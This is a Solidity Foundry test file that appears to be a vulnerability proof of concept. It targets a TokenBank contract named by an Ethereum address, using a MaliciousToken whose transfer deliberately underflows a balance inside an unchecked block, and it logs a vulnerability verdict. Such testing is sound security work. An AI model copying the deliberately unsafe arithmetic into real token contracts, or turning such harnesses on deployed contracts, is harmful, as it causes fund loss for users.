// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol";

contract TokenBankTest is Test {
    TokenBank public bank;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    MaliciousToken public maliciousToken;

    function setUp() public {
        vm.startPrank(owner);
        bank = new TokenBank();
        maliciousToken = new MaliciousToken();
        maliciousToken.setBalance(address(bank), 100);
        vm.stopPrank();
    }

    function test_ArithmeticUnderflowInToken() public {
        uint256 HUGE_NUMBER = 1e27 + 1;
        
        console.log("--- BEFORE ATTACK: BANK'S MALICIOUS TOKEN BALANCE ---");
        uint256 initialBankBalance = maliciousToken.balanceOf(address(bank));
        console.log("Initial balance:", initialBankBalance);
        assertEq(initialBankBalance, 100, "Initial bank balance should be 100 tokens");

        console.log("--- TRIGGER: WITHDRAWTOKEN EXPLOIT ---");
        vm.prank(owner);
        bank.WithdrawToken(address(maliciousToken), 1000, attacker);

        console.log("--- AFTER ATTACK: BANK'S MALICIOUS TOKEN BALANCE ---");
        uint256 finalBankBalance = maliciousToken.balanceOf(address(bank));
        console.log("Final balance:", finalBankBalance);
        
        console.log("--- VULNERABILITY VERDICT ---");
        if (finalBankBalance > HUGE_NUMBER) {
            console.log("Vulnerability Exists: The withdrawal caused an arithmetic underflow, resulting in a massive balance");
        } else {
            console.log("Vulnerability not Exist: The withdrawal did not cause an arithmetic underflow (balance within expected range)");
        }
        
        assertTrue(
            finalBankBalance > HUGE_NUMBER, 
            "Arithmetic underflow should result in massive balance"
        );
    }
}

contract MaliciousToken {
    mapping(address => uint256) public balanceOf;
    
    function setBalance(address account, uint256 balance) external {
        balanceOf[account] = balance;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        // Deliberately unsafe arithmetic
        unchecked {
            balanceOf[msg.sender] -= amount;  // Cause underflow
        }
        balanceOf[to] += amount;
        return true;
    }
}